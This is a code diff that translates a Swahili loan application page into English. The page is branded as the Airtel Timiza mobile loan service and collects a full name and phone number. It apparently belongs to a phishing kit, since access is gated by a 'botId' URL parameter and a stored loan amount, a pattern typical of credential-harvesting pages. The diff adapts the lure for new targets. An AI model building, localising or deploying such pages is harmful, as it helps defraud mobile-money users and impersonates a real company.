@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fomu ya Maombi ya Mkopo</title>
+<title>Loan Application Form</title>
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -62,31 +62,31 @@ button:disabled { background: #ccc; }
 
 <div class="loan-container">
     <div class="logo-container">
-     <h1>Airtel Timiza Mkopo</h1>   
+     <h1>Airtel Timiza Loan</h1>   
     </div>
 
-    <h2>Fomu ya Maombi ya Mkopo</h2>
+    <h2>Loan Application Form</h2>
 
     <form id="detailsForm">
-        <label>Jina Kamili</label>
-        <input id="name" placeholder="Jina" required>
+        <label>Full Name</label>
+        <input id="name" placeholder="Name" required>
 
-        <label>Nambari ya Simu</label>
+        <label>Phone Number</label>
         <input id="phone" placeholder="+255" required>
 
         <label class="checkbox-label">
             <input type="checkbox" id="confirmCheck">
-            Nakubali masharti na huduma za Mikopo ya Airtel Timiza
+            I agree to the terms and services of Airtel Timiza Loans
         </label>
 
-        <button id="nextBtn" disabled>Endelea</button>
+        <button id="nextBtn" disabled>Continue</button>
     </form>
 </div>
 
 <script>
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
-if (!botId) { alert("Kiungo batili cha ufikiaji"); throw new Error(); }
+if (!botId) { alert("Invalid access link"); throw new Error(); }
 
 if (!localStorage.getItem('loanAmount')) {
     window.location.href = `index.html?botId=${botId}`;
